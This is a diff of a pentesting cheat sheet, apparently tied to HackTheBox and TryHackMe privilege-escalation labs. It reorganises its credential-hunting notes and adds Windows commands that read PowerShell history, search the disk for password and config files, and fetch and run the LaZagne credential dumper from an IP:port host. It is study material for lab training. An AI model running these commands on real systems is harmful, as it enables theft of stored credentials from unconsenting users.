@@ -167,6 +167,7 @@ PS> powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
 ## Credential Hunting
 
 [![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+[![windows_privilege_escalation](../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
 [![linuxprivilegeescalation](../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
 [![adventofcyber2](../../_badges/thm/adventofcyber2/day24.svg)](https://tryhackme.com/room/adventofcyber2)
 [![linuxprivesc](../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
@@ -182,7 +183,7 @@ You may try to look for credentials. **Try password/key reuse**.
 Common places to dig for credentials are:
 
 * 🔐 command history <small>(ex: ~/.bash_history, \*hist\*)</small>
-* 🌍 browser history and [saved passwords](others/browser.md)
+* 🌍 browser [history, saved passwords, etc.](others/browser.md)
 * 🛣️ application and system [logs](/cybersecurity/blue-team/topics/logs.md) <small>(/var/log/)</small>
 * 🐚 backups <small>(.old, .bak, xxx~...)</small>
 * ✉️ conversations/mails <small>(/var/mail/)</small>
@@ -201,6 +202,21 @@ Manually dig for interesting or unexpected files
 * `%appdata%`: look for sensitive applications data
 
 Always put yourself in the target shoes.
+
+#### Automated Tools To Find Credentials
+
+[![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+
+You can use [LaZagne](https://github.com/AlessandroZ/LaZagne) <small>(9.0k ⭐)</small>.
+
+```ps
+PS> wget IP:port/LaZagne.exe -UseBasicParsing -O LaZagne.exe
+PS> .\LaZagne.exe all
+```
+
+You can use [Snaffler](https://github.com/SnaffCon/Snaffler) <small>(1.8k ⭐)</small>.
+
+You can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) <small>(1.1k ⭐, 2018 🪦)</small>.
 
 #### Linux CredHunting Notes
 
@@ -234,11 +250,13 @@ $ find / -wholename "*.git/config" 2> /dev/null | xargs grep "url"
 #### Windows CredHunting Notes
 
 [![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+[![windows_privilege_escalation](../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
 [![windowsprivesc20](../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)
 
 Read PowerShell console history:
 
 ```shell!
+PS> gc (Get-PSReadLineOption).HistorySavePath
 PS> type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 CMD> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
@@ -272,20 +290,15 @@ PS> type C:\xampp\FileZilla Server\FileZilla Server.xml
 PS> type C:\Program Files\FileZilla Server\FileZilla Server.xml
 ```
 
-#### Automated Tools To Find Credentials
+Additional Commands
 
-[![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+```shell!
+CMD> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+CMD> where /R C:\ *.txt *.ini *.cfg *.config *.xml
+CMD> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+PS> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
 
-You can use [LaZagne](https://github.com/AlessandroZ/LaZagne) <small>(9.0k ⭐)</small>.
-
-```ps
-PS> wget IP:port/LaZagne.exe -UseBasicParsing -O LaZagne.exe
-PS> .\LaZagne.exe all
 ```
-
-You can use [Snaffler](https://github.com/SnaffCon/Snaffler) <small>(1.8k ⭐)</small>.
-
-You can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) <small>(1.1k ⭐, 2018 🪦)</small>.
 </div></div>
 
 <hr class="sep-both">
